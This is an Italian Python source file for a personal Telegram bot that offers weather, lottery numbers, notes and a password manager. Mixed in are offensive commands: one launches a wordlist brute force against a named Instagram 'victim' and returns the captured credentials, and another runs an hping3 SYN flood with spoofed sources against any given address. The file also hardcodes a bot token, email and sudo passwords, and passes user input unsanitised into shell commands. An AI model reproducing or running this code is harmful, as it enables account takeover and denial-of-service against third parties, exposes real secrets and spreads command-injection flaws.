from telegram.ext import Updater, CommandHandler
from telegram.ext import MessageHandler, Filters
from pathlib import Path
import schedule,time,os
import telegram.ext
import random
import emoji
import requests 
import json,webbrowser
import datetime
from datetime import datetime, timedelta
import smtplib, ssl
from email.mime.text import MIMEText
import subprocess
import sys
from threading import Thread
import numpy as np 
import cv2 
import pyautogui
import socket 

TOKEN = '790486292:AAE2_Dowg0hRAjypMxlup73MAXOHglv6v2s'
updater = Updater(TOKEN, use_context=True)
j = updater.job_queue
uu=updater.job_queue

###################################################################
def unknown(update, context):
    context.bot.send_message(chat_id=update.effective_chat.id, text="Scusa non ho compreso bene il comando!!")

def leggi_file():
    import random
    lines=open("//home//pi//Desktop/bot//saluti.txt").read().splitlines()
    myline =random.choice(lines)
    return myline




def frasi():
	import random
	lines=open("//home//pi//Desktop/bot//frasi.txt").read().splitlines()
	myline =random.choice(lines)
	return myline
##########################################################
def check():
	hostname="8.8.8.8"
	time.sleep(1)
	os.system(f'python3 //home//pi//Desktop//bot//primario.py')
	time.sleep(1)
	try:
		response=os.system(f'ping -c 3 {hostname}')
		if response ==0:
			print("ATTIVA")
			time.sleep(1)
			os.system(f'python3 //home//pi//Desktop//bot//ciao.py')
			time.sleep(1)
			
		else:
			print("NON ATTIVA")
			context.bot.sendMessage(chat_id=update.effective_chat.id,text="La rete non e' attiva")
			context.bot.sendMessage(chat_id=update.effective_chat.id,text=emoji.emojize(":face_with_head-bandage:"))
			
	except socket.timeout:
		context.bot.sendMessage(chat_id=update.effective_chat.id,text="Socket timeout..Rinviami il messaggio")
		context.bot.sendMessage(chat_id=update.effective_chat.id,text=emoji.emojize(":pensive_face:"))


##########################################################
def password(update,context):
	 context.bot.sendMessage(chat_id=update.effective_chat.id,text="Ciao Claudio benvenuto nel tuo gestore password")
	 context.bot.sendMessage(chat_id=update.effective_chat.id,text=emoji.emojize(":grinning_face_with_smiling_eyes:"))
	 time.sleep(1)
	 esistenza=os.path.exists('//home//pi//Desktop//bot//(encrypted)pass.txt')
	 try:
		 elimina="rm" + " " + "//home//pi//Desktop//bot//pass.txt"
		 os.system(elimina)
	 except OSError:
		 pass

	 if esistenza == True:
		 password1=context.args[0]
		 context.bot.sendMessage(chat_id=update.effective_chat.id,text="Il file e' criptato...")
		 context.bot.sendMessage(chat_id=update.effective_chat.id,text=emoji.emojize(":zipper-mouth_face:"))
		 context.bot.sendMessage(chat_id=update.effective_chat.id,text="Avvio processo di decriptazione...")
		 programma="python" + " " + "//home//pi//Desktop//bot//password.py" + " " + password1
		 os.system(programma)
		 file=open("pass.txt","r")
		 riga=file.read()
		 pass1=context.bot.sendMessage(chat_id=update.effective_chat.id,text=riga)
		 time.sleep(2)
		 context.bot.sendMessage(chat_id=update.effective_chat.id,text="Invio password completata")
		 context.bot.sendMessage(chat_id=update.effective_chat.id,text=emoji.emojize(":grinning_face_with_smiling_eyes:"))
		 time.sleep(20)
		 #eliminazione messaggio utente
		 context.bot.deleteMessage(chat_id=update.effective_chat.id,message_id=update.message.message_id)
		 #eliminazione messaggio ultimo bot
		 context.bot.deleteMessage(chat_id=update.effective_chat.id,message_id=pass1['message_id'])
		 context.bot.sendMessage(chat_id=update.effective_chat.id,text="Password cancellate")
		 programma="python" + " " + "//home//pi//Desktop//bot//password.py" + " " + password1
		 os.system(programma)
		 elimina="rm" + " " + "//home//pi//Desktop//bot//pass.txt"
		 os.system(elimina)
		 
	 else:
		 bot.sendMessage(chat_id,"Il file e' decriptato...")
		 password1=context.args[0]
		 programma="python" + " " + "//home//pi//Desktop//bot//password.py" + " " + password1
		 os.system(programma)
		 context.bot.sendMessage(chat_id=update.effective_chat.id,text="Il file e' criptato...")
		 context.bot.sendMessage(chat_id=update.effective_chat.id,text=emoji.emojize(":zipper-mouth_face:"))
		 context.bot.sendMessage(chat_id=update.effective_chat.id,text="Avvio processo di decriptazione...")
		 programma="python" + " " + "//home//pi//Desktop//bot//password.py" + " " + password1
		 os.system(programma)
		 file=open("pass.txt","r")
		 riga=file.read()
		 pass1=bot.sendMessage(chat_id,riga)
		 time.sleep(2)
		 context.bot.sendMessage(chat_id=update.effective_chat.id,text="Invio password completata")
		 context.bot.sendMessage(chat_id=update.effective_chat.id,text=emoji.emojize(":grinning_face_with_smiling_eyes:"))
		 time.sleep(20)
		 #eliminazione messaggio utente
		 context.bot.deleteMessage(chat_id=update.effective_chat.id,message_id=update.message.message_id)
		 #eliminazione messaggio ultimo bot
		 context.bot.deleteMessage(chat_id=update.effective_chat.id,message_id=pass1['message_id'])
		 context.bot.sendMessage(chat_id=update.effective_chat.id,text="Password cancellate")
		 programma="python" + " " + "//home//pi//Desktop//bot//password.py" + " " + password1
		 os.system(programma)
		 elimina="rm" + " " + "//home//pi//Desktop//bot//pass.txt"
		 os.system(elimina)
##################################################################################
def password1(update,context):
	 context.bot.sendMessage(chat_id=update.effective_chat.id,text="Ciao Eleonora benvenuta nel tuo gestore password")
	 context.bot.sendMessage(chat_id=update.effective_chat.id,text=emoji.emojize(":grinning_face_with_smiling_eyes:"))
	 time.sleep(1)
	 esistenza=os.path.exists('//home//pi//Desktop//bot//(encrypted)pass_ele.txt')
	 try:
		 elimina="rm" + " " + "//home//pi//Desktop//bot//pass_ele.txt"
		 os.system(elimina)
	 except OSError:
		 pass

	 if esistenza == True:
		 password1=context.args[0]
		 context.bot.sendMessage(chat_id=update.effective_chat.id,text="Il file e' criptato...")
		 context.bot.sendMessage(chat_id=update.effective_chat.id,text=emoji.emojize(":zipper-mouth_face:"))
		 context.bot.sendMessage(chat_id=update.effective_chat.id,text="Avvio processo di decriptazione...")
		 programma="python" + " " + "//home//pi//Desktop//bot//password1.py" + " " + password1
		 os.system(programma)
		 file=open("pass_ele.txt","r")
		 riga=file.read()
		 pass1=context.bot.sendMessage(chat_id=update.effective_chat.id,text=riga)
		 time.sleep(2)
		 context.bot.sendMessage(chat_id=update.effective_chat.id,text="Invio password completata")
		 context.bot.sendMessage(chat_id=update.effective_chat.id,text=emoji.emojize(":grinning_face_with_smiling_eyes:"))
		 time.sleep(20)
		 #eliminazione messaggio utente
		 context.bot.deleteMessage(chat_id=update.effective_chat.id,message_id=update.message.message_id)
		 #eliminazione messaggio ultimo bot
		 context.bot.deleteMessage(chat_id=update.effective_chat.id,message_id=pass1['message_id'])
		 context.bot.sendMessage(chat_id=update.effective_chat.id,text="Password cancellate")
		 programma="python" + " " + "//home//pi//Desktop//bot//password1.py" + " " + password1
		 os.system(programma)
		 elimina="rm" + " " + "//home//pi//Desktop//bot//pass_ele.txt"
		 os.system(elimina)
		 
	 else:
		 bot.sendMessage(chat_id,"Il file e' decriptato...")
		 password1=context.args[0]
		 programma="python" + " " + "//home//pi//Desktop//bot//password1.py" + " " + password1
		 os.system(programma)
		 context.bot.sendMessage(chat_id=update.effective_chat.id,text="Il file e' criptato...")
		 context.bot.sendMessage(chat_id=update.effective_chat.id,text=emoji.emojize(":zipper-mouth_face:"))
		 context.bot.sendMessage(chat_id=update.effective_chat.id,text="Avvio processo di decriptazione...")
		 programma="python" + " " + "//home//pi//Desktop//bot//password1.py" + " " + password1
		 os.system(programma)
		 file=open("pass_ele.txt","r")
		 riga=file.read()
		 pass1=bot.sendMessage(chat_id,riga)
		 time.sleep(2)
		 context.bot.sendMessage(chat_id=update.effective_chat.id,text="Invio password completata")
		 context.bot.sendMessage(chat_id=update.effective_chat.id,text=emoji.emojize(":grinning_face_with_smiling_eyes:"))
		 time.sleep(20)
		 #eliminazione messaggio utente
		 context.bot.deleteMessage(chat_id=update.effective_chat.id,message_id=update.message.message_id)
		 #eliminazione messaggio ultimo bot
		 context.bot.deleteMessage(chat_id=update.effective_chat.id,message_id=pass1['message_id'])
		 context.bot.sendMessage(chat_id=update.effective_chat.id,text="Password cancellate")
		 programma="python" + " " + "//home//pi//Desktop//bot//password1.py" + " " + password1
		 os.system(programma)
		 elimina="rm" + " " + "//home//pi//Desktop//bot//pass_ele.txt"
		 os.system(elimina)


############################################################################
def meteo(update,context):
	saluto=leggi_file()
	context.bot.sendMessage(chat_id=update.effective_chat.id, text='%s Eleonora e Claudio, sono Perseus a vostra disposizione!!!'%saluto)
	context.bot.sendMessage(chat_id=update.effective_chat.id,text=emoji.emojize(":grinning_face_with_smiling_eyes:"))
	try:
		try:
			city_name=context.args[0:]
			city_name=" ".join(city_name)
			print(city_name)
			context.bot.sendMessage(chat_id=update.effective_chat.id,text= 'Previsioni del meteo per %s' %city_name)
			api_key = "58f1e77f68f6dfc6ab53cadc0092c4a6"
			base_url = "http://api.openweathermap.org/data/2.5/weather?"
			complete_url = base_url + "appid=" + api_key + "&q=" + city_name 
			response = requests.get(complete_url) 
			x = response.json()
			y = x['main']
			current_temperature=y['temp']
			current_temperature=str((current_temperature-273.15))
			current_humidity = str(y["humidity"])
			z= x['weather']
			descrizione=z[0]["description"]
			n=x['wind']
			vento=n["speed"]
			time.sleep(1)
			#PARAMETRI METEO
			context.bot.sendMessage(chat_id=update.effective_chat.id,text="Temperatura: %s Gradi" %current_temperature)
			context.bot.sendMessage(chat_id=update.effective_chat.id,text="Umidita: %s %%" %current_humidity)
			context.bot.sendMessage(chat_id=update.effective_chat.id,text="Velocita Vento: %s m/s" %vento)
			context.bot.sendMessage(chat_id=update.effective_chat.id,text="Descrizione: %s" %descrizione) 
			#TIPI DI METEO
			if descrizione=="clear sky" or descrizione=="sun":
				context.bot.sendMessage(chat_id=update.effective_chat.id,text=emoji.emojize(":sun:"))
			elif  descrizione=="Cloudy" or descrizione=="cloud" or descrizione=="scattered clouds" or descrizione=="broken clouds" or descrizione=="overcast clouds":
				context.bot.sendMessage(chat_id=update.effective_chat.id,text=emoji.emojize(":cloud:"))
			elif descrizione=="haze" or descrizione=="Haze" or descrizione== "mist" or descrizione=="Mist":
				context.bot.sendMessage(chat_id=update.effective_chat.id,text=emoji.emojize(":fog:"))
			elif descrizione=="few cloud" or descrizione=="few clouds":
				context.bot.sendMessage(chat_id=update.effective_chat.id,text=emoji.emojize(":sun_behind_cloud:"))
			elif descrizione=="light rain" or descrizione=="rain" or descrizione=="shower rain" or descrizione=="light intensity shower rain" or descrizione=="moderate rain":
				context.bot.sendMessage(chat_id=update.effective_chat.id,text=emoji.emojize(":cloud_with_rain:"))
			elif descrizione=="thunderstorm" or descrizione=="thunderstorm with light rain":
				context.bot.sendMessage(chat_id=update.effective_chat.id,text=emoji.emojize(":cloud_with_lightning_and_rain:"))
			elif descrizione=="snow" or descrizione=="light snow":
				context.bot.sendMessage(chat_id=update.effective_chat.id,text=emoji.emojize(":cloud_with_snow:"))
			
		except  socket.timeout:
			context.bot.sendMessage(chat_id=update.effective_chat,text="Socket timeout..Rinviami il messaggio")
			context.bot.sendMessage(chat_id=update.effective_chat,text=emoji.emojize(":pensive_face:"))
	
	except KeyError:
		context.bot.sendMessage(chat_id=update.effective_chat.id,text="Nome citta errato oppure scrivila in Inglese...")

######################################################################
def numeri(update,context):
	 saluto=leggi_file()
	 context.bot.sendMessage(chat_id=update.effective_chat.id, text='%s Eleonora e Claudio, sono Perseus a vostra disposizione!!!'%saluto)
	 context.bot.sendMessage(chat_id=update.effective_chat.id,text=emoji.emojize(":grinning_face_with_smiling_eyes:"))
	 context.bot.sendMessage(chat_id=update.effective_chat.id,text="Ecco a voi i numeri...")
	 l = []
	 while len(l) < 6:
		 numero = random.randint(1,90)
		 if numero not in l:
			 l.append(numero)
			 numero=str(numero)
			 context.bot.sendMessage(chat_id=update.effective_chat.id,text="%s" %numero)
			 time.sleep(1)
	 context.bot.sendMessage(chat_id=update.effective_chat.id,text=emoji.emojize(":grinning_face_with_smiling_eyes:"))

####################################################
def frasi23(update,context):
	frasi1=frasi()
	context.bot.send_message(chat_id=update.effective_chat.id,text=emoji.emojize(":double_exclamation_mark:"))
	context.bot.send_message(chat_id=update.effective_chat.id,text=frasi1)
	context.bot.send_message(chat_id=update.effective_chat.id,text=emoji.emojize(":double_exclamation_mark:"))
	time.sleep(3)
#####################################################
def callback_minute1(context: telegram.ext.CallbackContext):
	
	def client_program(message):
		host = "192.168.1.49" # as both code is running on same pc
		port = 5003  # socket server port number
		client_socket = socket.socket()  # instantiate
		client_socket.connect((host, port))  # connect to the server
		print(message)
		client_socket.send(message.encode())  # send message
		client_socket.close()
		
	def procedura_invio(data,corpo):
		port = 587  # For starttls
		smtp_server = "smtp.gmail.com"
		sender_email = "orionperseus999@gmail.com"
		receiver_email = "claudio.rimensi.1996.uni@gmail.com"
		password = "orologio96"
		msg = MIMEText(f'Appuntamento: {str(data)} {str(corpo)}')
		msg['Subject'] = 'Appuntamento immimente!!!'
		msg['From'] = sender_email
		msg['To'] = receiver_email

		context = ssl.create_default_context()
		try:
			with smtplib.SMTP(smtp_server, port) as server:
				server.ehlo()  # Can be omitted
				server.starttls(context=context)
				server.ehlo()  # Can be omitted
				server.login(sender_email, password)
				server.sendmail(sender_email, receiver_email, msg.as_string())
				# tell the script to report if your message was sent or which errors need to be fixed 
				print('Sent')
				
		except (gaierror, ConnectionRefusedError):
			print('Failed to connect to the server. Bad connection settings?')
		except smtplib.SMTPServerDisconnected:
			print('Failed to connect to the server. Wrong user/password?')
		except smtplib.SMTPException as e:
			print('SMTP error occurred: ' + str(e))
			
	def send():
		fn = "claudio_note.txt"
		f = open(fn)
		output=[]
		data_adesso=datetime.now()
		data_adesso=str(data_adesso)
		data_adesso=data_adesso[:10]
		data_adesso=datetime.strptime(data_adesso, '%Y-%m-%d').strftime('%d/%m/%Y')
		for myline in f:
			data=myline[:10]
			corpo=myline[10:]
			corpo=str(corpo)
			print(corpo)
			dt_object1 = datetime.strptime(data, "%d/%m/%Y")
			futuredate = dt_object1 - timedelta(days=1)
			futuredate = str(futuredate)
			futuredate = futuredate[:10]
			futuredate1 = dt_object1 - timedelta(days=0)
			futuredate1 = str(futuredate1)
			futuredate1 = futuredate1[:10]
			data_finale=datetime.strptime(futuredate, '%Y-%m-%d').strftime('%d/%m/%Y')
			data_finale1=datetime.strptime(futuredate1, '%Y-%m-%d').strftime('%d/%m/%Y')           
			if data_adesso != data_finale:
				pass
				
			elif data_adesso == data_finale:
				procedura_invio(data,corpo)
				client_program("start Ti ho inviato un appuntamento/i per email. CONTROLLA!!!")
				
	
			
		f.close
	send()
#####################################################
def callback_minute(context: telegram.ext.CallbackContext):
	hostname="8.8.8.8"
	context.bot.send_message(chat_id='502522267',text='Ti aggiorno sul mio stato di salute..')
	context.bot.send_message(chat_id='502522267',text='Fra qualche minuto riceverai il grafico della Uso e della Temperatura della CPU...')
	context.bot.send_message(chat_id='502522267',text='Ti saranno inviati anche i grafici relativi all Upload e Download (Kb\s)...')
	response=os.system(f'ping -c 3 {hostname}')
	if response ==0:
		context.bot.send_message(chat_id='502522267',text="La rete is UP") 
		context.bot.send_message(chat_id='502522267',text=emoji.emojize(":grinning_face_with_smiling_eyes:")) 
		check()
	else:
		context.bot.send_message(chat_id='502522267',text="La rete is DOWN")
		context.bot.send_message(chat_id='502522267',text=emoji.emojize(":face_with_head-bandage:"))
	
	context.bot.send_photo(chat_id='502522267',photo=open('//home//pi//Desktop//bot//grafico.png', 'rb'))
	context.bot.send_photo(chat_id='502522267',photo=open('//home//pi//Desktop//bot//grafico1.png', 'rb'))
	context.bot.send_photo(chat_id='502522267',photo=open('//home//pi//Desktop//bot//grafico3.png', 'rb'))
	context.bot.send_photo(chat_id='502522267',photo=open('//home//pi//Desktop//bot//grafico4.png', 'rb'))
	
###########################################################
def business(update,context):
	comando1=f'adb shell screencap -p /sdcard/screencap.png'
	comando2=f'adb pull /sdcard/screencap.png'
	comando3= f'adb shell dumpsys battery > stato_telefono.txt'
	os.system(comando1)
	os.system(comando2)
	os.system(comando3)
	time.sleep(2)
	with open("stato_telefono.txt","r") as file:
		leggo1=file.read()
	context.bot.send_photo(chat_id=update.effective_chat.id,photo=open('/home/pi/Desktop/bot/screencap.png','rb'))
	context.bot.sendMessage(chat_id=update.effective_chat.id,text="Ricordati che quando ti invio lo screenshot il contatore sara' 10 in meno")
	context.bot.send_message(chat_id=update.effective_chat.id,text=emoji.emojize(":grinning_face_with_smiling_eyes:"))
	context.bot.sendMessage(chat_id=update.effective_chat.id,text="Ora ti invio lo stato del telefono..")
	time.sleep(1)
	context.bot.sendMessage(chat_id=update.effective_chat.id,text=leggo1)
##################################################################
def control_header(update,context):
	url=context.args[0:]
	url=" ".join(url)
	comando=f'python3  /home/pi/Desktop/bot/shcheck.py {url} > risultato.txt'
	os.system(comando)
	with open("risultato.txt","r") as file:
		leggo2= file.read()

	with open("informazioni","r") as file:
		leggo3= file.read()
	context.bot.send_message(chat_id=update.effective_chat.id,text=leggo3 + emoji.emojize(":grinning_face_with_smiling_eyes:"))
	time.sleep(2)
	context.bot.send_message(chat_id=update.effective_chat.id,text="Ecco i risultati")
	time.sleep(1)
	context.bot.send_message(chat_id=update.effective_chat.id,text=leggo2 + emoji.emojize(":grinning_face_with_smiling_eyes:"))
################################################################################################	
def repo(update,context):
	comando=f'bash /home/pi/Desktop/bot/repo.sh'
	os.system(comando)
	with open("repo.txt","r") as fp:
		line = fp.readline()
		cnt = 1
		while line:
			print("Line {}: {}".format(cnt, line.strip()))
			with open("repo2.txt","a") as file2:
				file2.write("Line {}: {}".format(cnt, line.strip()))
				file2.write("\n")
				file2.write("\n")
				
			line = fp.readline()
			cnt += 1
			
	with open("repo2.txt","r") as file:
		line2 = file.read()	
		
	context.bot.send_message(chat_id=update.effective_chat.id,text=line2 + emoji.emojize(":grinning_face_with_smiling_eyes:"))
	comando3="rm /home/pi/Desktop/bot/repo2.txt"
	os.system(comando3)

########################################################################################	
def instagram(update,context):
	username=context.args[0:]
	username=" ".join(username)
	print(username)
	comando=f'gnome-terminal --tab -- bash -c  "python3 /home/pi/Desktop/Instagram/instagram.py {username} /home/pi/Desktop/Instagram/password_list.txt -m 2"'
	os.system(comando)
	emoction=emoji.emojize(":grinning_face_with_smiling_eyes:")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text=f'Il programma sta lavorando {emoction}')
#########################################################################################	
def instagram_aggiornamento(update,context):
	emoction=emoji.emojize(":grinning_face_with_smiling_eyes:")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text=f'Provo ad inviare il file contenete le credenziali di accesso {emoction}')
	try:
		context.bot.send_document(chat_id=update.effective_chat.id,document=open('/home/pi/Desktop/Instagram/accounts.txt','rb'))
		os.remove('/home/pi/Desktop/Instagram/accounts.txt')
	except FileNotFoundError:
		context.bot.sendMessage(chat_id=update.effective_chat.id,text='Mi dispiace ma non ho trovato file,quindi il programma non ha ancora finito il suo lavoro')
##########################################################################################
def callback_minute2(context: telegram.ext.CallbackContext):
	indirizzo="scan"
	secondo="scan"
	context.bot.sendMessage(chat_id='502522267',text='Scanning network in corso')
	sudoPassword = 'omen96'
	command = f'python3 /home/pi/Desktop/bot/network_analyis.py {indirizzo} {secondo}'
	os.system(f'echo %s|sudo -s %s' % (sudoPassword, command))
	time.sleep(5)
	image = pyautogui.screenshot() 
	image = cv2.cvtColor(np.array(image),cv2.COLOR_RGB2BGR) 
	cv2.imwrite("image1.png", image)
	context.bot.send_photo(chat_id='502522267',photo=open('/home/pi/Desktop/bot/image1.png','rb'))	
##################################################################
def help1(update,context):
	context.bot.sendMessage(chat_id=update.effective_chat.id,text='Ecco quello che posso fare per voi, per adesso...')
	context.bot.sendMessage(chat_id=update.effective_chat.id,text="/meteo [nome_citta]: Vi do le previsioni del meteo della citta che volete")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text="/numeri: Vi do random 6 numeri se volete giocare al superenalotto :) Che la fortuna possa essere sempre dalla vostra parte")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text="/password [password_Claudio]")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text="/password1 [password_Eleonora]")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text="/nota [leggi : se vuoi leggere le note]")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text="/frasi Frasi motivazionali ")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text="/bruteforce_instagram [nome_vittima_instagram]")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text="/agg_insta")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text="/header [url] : Mostra se ci sono parametri di sicurezza negli header del web server")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text="/repo : Lista di tutti i repo del mio padrone")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text="/scan : ([indirizzo_ip] oppure [indirizzo_ip] dos)")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text="/help: Vi mostro i comandi che potete scrivere perche io vi possa rispondere")
#######################################################################################
def scan(update,context):
	indirizzo=context.args[0:]
	indirizzo=" ".join(indirizzo)
	
	if indirizzo.find("dos") != -1:
		context.bot.sendMessage(chat_id=update.effective_chat.id,text='Dos attacking... Mi sacrifico :D')
		indirizzo=indirizzo.replace('dos','')
		sudoPassword = 'omen96'
		command = f'hping3 -c 1000 -d 120 -S -w 64 -p 21 --flood --rand-source {indirizzo}'
		os.system(f'echo %s|sudo -s %s' % (sudoPassword, command))
		context.bot.sendMessage(chat_id=update.effective_chat.id,text='Dos attacking done')
		
	if indirizzo=="":
		indirizzo="scan"
		secondo="scan"
		context.bot.sendMessage(chat_id=update.effective_chat.id,text='Scanning network in corso')
		sudoPassword = 'omen96'
		command = f'python3 /home/pi/Desktop/bot/network_analyis.py {indirizzo} {secondo}'
		os.system(f'echo %s|sudo -s %s' % (sudoPassword, command))
		time.sleep(5)
		image = pyautogui.screenshot() 
		image = cv2.cvtColor(np.array(image),cv2.COLOR_RGB2BGR) 
		cv2.imwrite("image1.png", image)
		context.bot.send_photo(chat_id=update.effective_chat.id,photo=open('/home/pi/Desktop/bot/image1.png','rb'))
		
	elif indirizzo!="scan":
		secondo="ping"
		context.bot.sendMessage(chat_id=update.effective_chat.id,text=f'1- Ping indirizzo {indirizzo}')
		sudoPassword = 'omen96'
		command = f'python3 /home/pi/Desktop/bot/network_analyis.py {indirizzo} {secondo}'
		os.system(f'echo %s|sudo -s %s' % (sudoPassword, command))
		image = pyautogui.screenshot() 
		image = cv2.cvtColor(np.array(image),cv2.COLOR_RGB2BGR) 
		cv2.imwrite("image1.png", image)
		context.bot.send_photo(chat_id=update.effective_chat.id,photo=open('/home/pi/Desktop/bot/image1.png','rb'))
		time.sleep(1)
		secondo="port"
		context.bot.sendMessage(chat_id=update.effective_chat.id,text=f'2- Scanning port {indirizzo}')
		sudoPassword = 'omen96'
		command = f'python3 /home/pi/Desktop/bot/network_analyis.py {indirizzo} {secondo}'
		os.system(f'echo %s|sudo -s %s' % (sudoPassword, command))
		time.sleep(4)
		image = pyautogui.screenshot() 
		image = cv2.cvtColor(np.array(image),cv2.COLOR_RGB2BGR) 
		cv2.imwrite("image1.png", image)
		context.bot.send_photo(chat_id=update.effective_chat.id,photo=open('/home/pi/Desktop/bot/image1.png','rb'))
#######################################################################################
def nota(update,context):
	print("Sono entrato nella sezione delle note...\n")
	data=context.args[0]
	
	#cancello
	if data == "cancella":
		file = open("claudio_note.txt", "w").close()
		time.sleep(1)
		context.bot.send_message(chat_id=update.effective_chat.id,text="Eliminazione avvenuta correttamente del contenuto nel file") 
		context.bot.send_message(chat_id=update.effective_chat.id,text=emoji.emojize(":grinning_face_with_smiling_eyes:"))
	
	
	
	#leggo
	if data=="leggi":
		print("entro")
		def delete():
			fn = "claudio_note.txt"
			f = open(fn)
			output=[]
			data_adesso=datetime.now()
			
			for myline in f:
				print(myline)
				data=myline[:10]
				dt_object1 = datetime.strptime(data, "%d/%m/%Y")             
				if dt_object1 < data_adesso:
					pass
					
				elif dt_object1 >= data_adesso:
					output.append(myline)
			
			f.close
			f = open("claudio_note.txt", 'w')
			f.writelines(output)
			f.close()
			
		delete()
		
		with open("claudio_note.txt", "r") as file:
			line = file.readline()
			cnt = 1
			while line:
				testo="Appuntamento {}----> {}".format(cnt, line.strip())
				context.bot.send_message(chat_id=update.effective_chat.id,text=testo) 
				print("Line {}: {}".format(cnt, line.strip()))
				line = file.readline()
				cnt += 1
		

		
		time.sleep(1)
		context.bot.send_message(chat_id=update.effective_chat.id,text="Lettura avvenuta correttamente del file") 
		context.bot.send_message(chat_id=update.effective_chat.id,text=emoji.emojize(":grinning_face_with_smiling_eyes:"))
	
	#scrivi
	if data!="":	
		note=context.args[1:]
		note=" ".join(note)
		giorni_della_settimana=["Lunedi","Martedi","Mercoledi","Giovedi","Venerdi","Sabato","Domenica"]
		data= data.split("/")
		data_appuntamento=datetime(int(data[2]),int(data[1]),int(data[0]))
		data_vera_propria=f'{data[0]}/{data[1]}/{data[2]}'
		data_appuntamento=data_appuntamento.weekday()
		giorno_del_mese= giorni_della_settimana[data_appuntamento]

		if note != "" and note != "cancella":
				
			with open("claudio_note.txt", "a") as file:
				data=file.write(f"{data_vera_propria} --> {giorno_del_mese} : {note}")
				data=file.write("\n")
				
			time.sleep(1)
			context.bot.send_message(chat_id=update.effective_chat.id,text="Scrittura avvenuta correttamente sul file") 
			context.bot.send_message(chat_id=update.effective_chat.id,text=emoji.emojize(":grinning_face_with_smiling_eyes:"))	
	
	
#########################################################################################
#FUNZIONE PRINCIPALE     
def main():
	print("Sto ascoltando...")
	dp = updater.dispatcher
	dp.add_handler(CommandHandler('help', help1))
	dp.add_handler(CommandHandler('numeri', numeri))
	dp.add_handler(CommandHandler('nota',nota))
	dp.add_handler(CommandHandler('scan',scan,pass_args=True,pass_chat_data=True))
	dp.add_handler(CommandHandler('frasi',frasi23))
	dp.add_handler(CommandHandler('password',password,pass_args=True,pass_chat_data=True))
	dp.add_handler(CommandHandler('password1',password1,pass_args=True,pass_chat_data=True))
	dp.add_handler(CommandHandler('meteo',meteo,pass_args=True,pass_chat_data=True))
	dp.add_handler(CommandHandler('business',business))
	dp.add_handler(CommandHandler('bruteforce_instagram',instagram,pass_args=True,pass_chat_data=True))
	dp.add_handler(CommandHandler('agg_insta',instagram_aggiornamento))
	dp.add_handler(CommandHandler('repo',repo))
	dp.add_handler(CommandHandler('header',control_header,pass_args=True,pass_chat_data=True))
	job_minute1 = j.run_repeating(callback_minute1, interval=18000, first=0)
	job_minute2 = j.run_repeating(callback_minute2, interval=18000, first=0)
	job_minute = j.run_repeating(callback_minute, interval=10800, first=0)
	
	
	unknown_handler = MessageHandler(Filters.command, unknown)
	dp.add_handler(unknown_handler)
	updater.start_polling()
	updater.idle()


main()
